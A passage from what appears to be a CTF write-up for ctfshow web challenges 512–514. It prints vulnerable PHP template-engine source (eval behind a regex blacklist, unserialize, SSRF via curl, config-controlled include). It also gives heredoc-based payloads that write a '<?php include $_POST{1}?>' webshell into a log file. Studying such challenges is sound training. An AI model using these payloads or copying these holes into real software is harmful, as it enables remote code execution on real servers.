class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">        <span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;affected_rows;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为过滤掉了()所以采用include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="comment">#为了结束上一个$v的赋值语句</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">&lt;?php includ</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">e $</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$v1</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">_POS</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&lt;&lt;&lt; ctfshow</span></span><br><span class="line"><span class="string">T&#123;1&#125;?&gt;</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">1.php</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">clone</span> <span class="variable">$db</span>;<span class="comment">#克隆一个$db对象,原因是$db有写文件的方法</span></span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;log = <span class="variable">$d</span>;<span class="comment">#前一个log是db类的log后面的是dblog类的log</span></span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;content = <span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$v1</span>.<span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#$a.$b.$v1$c=&lt;?php include $_POST&#123;1&#125;?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">&lt;?php includ</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">e $</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$v1</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">_POS</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">T&#123;1&#125;?&gt;</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&lt;&lt;&lt;ctfshow</span></span><br><span class="line"><span class="string">2.php</span></span><br><span class="line"><span class="string">ctfshow</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="keyword">clone</span> <span class="variable">$db</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;log=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;log-&gt;content=<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$v1</span>.<span class="variable">$c</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="keyword">var</span>:nickname&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414163202241.png" alt="image-20220414163202241"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414155052515.png" alt="image-20220414155052515"></p>
<p>记得抓包改</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414155109466.png" alt="image-20220414155109466"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414163241108.png" alt="image-20220414163241108"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414163406655.png" alt="image-20220414163406655"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414163441821.png" alt="image-20220414163441821"></p>
<h1 id="web513"><a href="#web513" class="headerlink" title="web513"></a>web513</h1><p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-26 07:25:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkFoot</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>)))&#123;</span><br><span class="line">					<span class="variable">$encode</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$value</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">					<span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">					<span class="variable">$ret</span>=<span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">					<span class="variable">$encode</span> = <span class="string">&#x27;data:image/jpg/png/gif;base64,&#x27;</span> . <span class="variable">$ret</span>;</span><br><span class="line">					<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../cache/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$value</span>), <span class="variable">$encode</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$encode</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkConfig</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$config</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;config:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVar</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\(|\[|\`|\&#x27;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">					<span class="keyword">eval</span>(<span class="string">&#x27;$v=&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">					<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;var:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$v</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line">				<span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line">				<span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;api&#x2F;admin_settings.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-16 15:50:14</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-16 16:26:31</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$user</span>= <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;查询失败&quot;</span>,</span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">	<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="variable">$config</span>[<span class="variable">$key</span>]=<span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$config</span>));</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;管理员信息修改成功&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;请登录后使用此功能&#x27;</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFoot</span>(<span class="params"><span class="variable">$templateContent</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;cnzz&#125;&#125;&#x27;</span>)) &#123;</span><br><span class="line">			<span class="variable">$config</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/../config/settings&#x27;</span>));</span><br><span class="line">			<span class="variable">$foot</span> = <span class="variable">$config</span>[<span class="string">&#x27;cnzz&#x27;</span>];</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$foot</span>))&#123;</span><br><span class="line">				<span class="variable">$foot</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$foot</span>);</span><br><span class="line">				<span class="keyword">include</span>(<span class="variable">$foot</span>);</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以将config中的cnzz改成另一个文件,这样就可以使foot先访问config中的cnzz,接着cnzz又是另一个文件.进行二次文件访问.</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414175947530.png" alt="image-20220414174933530"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414180031940.png" alt="image-20220414180031940"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414180041275.png" alt="image-20220414180041275"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414180054215.png" alt="image-20220414180054215"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414180124402.png" alt="image-20220414180124402"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414181027066.png" alt="image-20220414181027066"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220414181233123.png" alt="image-20220414181233123"></p>
<h1 id="web514"><a href="#web514" class="headerlink" title="web514"></a>web514</h1><p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-28 16:27:27</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.sml&#x27;</span>);</span><br><span class="line">		<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkImage</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkConfig</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkVar</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">		<span class="variable">$templateContent</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">checkFoot</span>(<span class="variable">$templateContent</span>);</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/gopher|file/i&#x27;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">				<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$templateContent</span>, <span class="string">&#x27;&#123;&#123;img:&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>))&#123;</span><br><span class="line">				<span class="variable">$encode</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">				<span 